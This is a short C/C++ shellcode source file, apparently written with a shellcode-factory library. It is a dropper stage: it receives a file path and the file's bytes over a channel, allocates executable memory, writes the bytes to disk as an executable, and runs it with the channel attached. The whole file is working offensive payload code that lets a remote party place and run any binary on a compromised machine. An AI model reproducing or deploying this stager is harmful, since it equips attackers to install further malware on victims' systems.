#include <factory.h>

#include "lib/pico/channel.cc"
#include "lib/pico/io.cc"
#include "lib/pico/memory.cc"
#include "lib/pico/process.cc"

SHELLCODE_ENTRY
{
    Channel channel;
    unsigned int file_sz;
    char file_path[256];
    void *file_contents;

    /* Read the path. */
    channel.recv(file_path, sizeof(file_path));

    /* Read the file size. */
    channel.recv(&file_sz, sizeof(file_sz));
    
    /* Read the file data. */
    file_contents = allocate_memory(file_sz, PROT_READ|PROT_WRITE|PROT_EXEC);
    channel.recv(file_contents, file_sz);

    /* Drop executable file. */
    drop_file(file_path, S_IRUSR|S_IWUSR|S_IXUSR, file_contents, file_sz); 

    char *const argv[] = { NULL };
    char *const envp[] = { NULL };

    /* Execute the dropped executable. */
    execute(file_path, argv, envp, channel);
}
